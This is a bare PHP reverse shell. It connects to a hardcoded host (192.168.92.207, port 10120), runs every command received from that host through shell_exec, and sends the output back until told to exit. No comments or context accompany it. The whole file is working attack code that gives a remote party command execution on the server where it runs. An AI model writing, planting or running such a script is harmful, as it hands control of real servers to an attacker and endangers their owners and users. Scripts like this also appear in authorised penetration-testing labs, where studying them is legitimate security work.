<?php
$host = '192.168.92.207';
$port = 10120;

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($socket, $host, $port);

while (true) {
    $command = socket_read($socket, 1024);
    if (strtolower($command) == 'exit') {
        break;
    }

    $output = shell_exec($command);
    socket_write($socket, $output, strlen($output));
}

socket_close($socket);
?>
